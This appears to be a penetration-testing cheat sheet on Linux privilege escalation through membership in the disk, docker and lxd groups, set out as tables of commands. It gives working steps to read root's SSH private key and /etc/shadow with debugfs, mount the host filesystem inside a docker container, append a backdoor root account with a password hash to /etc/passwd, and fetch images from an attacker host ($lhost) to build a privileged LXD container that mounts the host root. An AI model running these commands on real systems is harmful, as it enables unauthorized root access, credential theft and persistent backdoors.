# Groups

## Disk

| Info                      | Command                          |
| ------------------------- | -------------------------------- |
| Find where "/" is mounted | `df -h`                          |
| Connect using debugfs     | `debugfs /dev/sda1`              |
| Change to root            | `debugfs: cd /root`              |
| List files                | `debugfs: ls`                    |
| View root certificate     | `debugfs: cat /root/.ssh/id_rsa` |
| View shadow file          | `debugfs: cat /etc/shadow`       |

## Docker

| Info                                                                                 | Command                                                                                            |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| Get images from the docker service                                                   | `docker image ls`                                                                                  |
| Get a shell inside a docker container with access as root to the filesystem          | `docker run -it --rm -v /:/mnt $imagename chroot /mnt bash`                                        |
| If you want full access from the host, create a backdoor in the passwd file          | `echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd`             |
| If you just want filesystem and network access you can start the following container | `docker run --rm -it --pid=host --net=host --privileged -v /:/mnt $imagename chroot /mnt bashbash` |

## LXD

<table><thead><tr><th width="287">Info</th><th>Command</th></tr></thead><tbody><tr><td>Download images</td><td><code>wget http://$lhost/linux/privesc/lxd/lxd.tar.xz</code></td></tr><tr><td>Download images</td><td><code>wget http://$lhost/linux/privesc/lxd/rootfs.squashfs</code></td></tr><tr><td>Import images</td><td><code>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine</code></td></tr><tr><td>Show imported image</td><td><code>lxc image list</code></td></tr><tr><td>Initialze the container</td><td><code>lxc init alpine privesc -c security.privileged=true</code></td></tr><tr><td>Create storage if needed</td><td><code>lxd init</code></td></tr><tr><td>Mount the local file system</td><td><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></td></tr><tr><td>Start the container</td><td><code>lxc start privesc</code></td></tr><tr><td>Get a shell in the container</td><td><code>lxc exec privesc /bin/sh</code></td></tr></tbody></table>
